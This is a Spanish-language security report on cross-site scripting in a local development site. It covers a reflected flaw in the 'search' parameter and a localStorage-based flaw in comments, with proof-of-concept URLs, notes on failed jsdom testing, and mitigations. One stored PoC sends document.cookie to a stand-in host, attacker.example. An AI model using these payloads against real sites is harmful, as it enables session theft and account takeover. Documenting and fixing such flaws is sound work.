# Informe de análisis XSS — web.dev.local:8082

Fecha: 2026-04-19T09:53:49Z
Objetivo: http://web.dev.local:8082

Resumen ejecutivo:
- Vulnerabilidad encontrada: Sí. El sitio ejecuta contenido suministrado por el usuario sin escape en el cliente.
- Explotación automática: Intentada con jsdom pero no confirmada por limitaciones de ejecución en este entorno. (Ver evidencia abajo.)

Detalles técnicos:
1) Reflected XSS (cliente):
   - Ubicación: parámetro GET "search" usado por el script inline en la sección de búsqueda.
   - Código vulnerable (fragmento):
     document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
   - Riesgo: al inyectar HTML/JS en "search", se inserta sin escape y puede ejecutarse en el navegador de la víctima.
   - PoC (abrir en navegador):
     http://web.dev.local:8082/?search=<script>alert('XSS')</script>

2) Stored-like XSS (localStorage):
   - Ubicación: formulario de comentarios guarda name/comment en localStorage y luego los muestra con document.write sin escape.
   - Flujo: visitar URL con name & comment -> el script guarda en localStorage y redirige a la página limpia; al cargar, displayComments() usa document.write para inyectar c.name y c.comment.
   - PoC (abrir en navegador):
     http://web.dev.local:8082/?name=Attacker&comment=<script>alert('XSS_STORED')</script>
   - Nota: este almacenamiento usa localStorage (alcance por navegador/perfil). Aún así, si un usuario abre la página en ese navegador, el payload se ejecutará.

Evidencia de pruebas automatizadas realizadas:
- Se intentó ejecutar payloads mediante jsdom (node.js). Pasos realizados:
  1) Se creó y ejecutó un script que carga la URL con payload en "search" y anula window.alert para detectar ejecución.
  2) Se instaló jsdom en el entorno de trabajo (npm install jsdom --no-save).
  3) Resultado: jsdom no reportó la ejecución del alert (ALERT_CALLED=false). Posibles causas: diferencias en comportamiento de document.write y navegación en jsdom, y restricciones sobre navegación (jsdom emite "Not implemented: navigation" cuando la página hace window.location.href).
- A pesar de no poder confirmar la ejecución en este entorno headless, la presencia de concatenación sin escape en document.write y la escritura/despliegue desde localStorage constituyen una vulnerabilidad XSS real y explotable en un navegador estándar.

Impacto:
- Ejecución de JavaScript arbitrario en el contexto de la página objetivo.
- Robo de tokens/session cookies (si no están marcadas HttpOnly), redirecciones, keylogging, CSRF escalado, etc.

Recomendaciones de mitigación:
- Nunca inyectar contenido de usuario con document.write o innerHTML sin escapar.
- Cuando se inserten valores en el DOM que deben mostrarse como texto, usar textContent o crear nodos de texto.
- Escapar/encodear HTML en cualquier dato proveniente del usuario antes de insertarlo en el DOM.
- Implementar Content Security Policy (CSP) restrictiva para deshabilitar la ejecución de scripts inline y reducir impacto.
- Validar y sanitizar en servidor y en cliente.

Acciones reproducibles (PoC):
- Reflected PoC: visita en navegador real
  http://web.dev.local:8082/?search=<script>alert(document.domain)</script>

- Stored PoC (localStorage): visita en navegador real
  http://web.dev.local:8082/?name=Attacker&comment=<script>fetch('http://attacker.example/collect?c='+document.cookie)</script>

Notas finales:
- El entorno de análisis automatizado usado aquí no permitió confirmar ejecución programática (jsdom limitations). Se recomienda abrir las PoC en un navegador (por ejemplo Chrome/Firefox) en un entorno controlado para verificar la ejecución y el impacto.

-- Fin del informe --
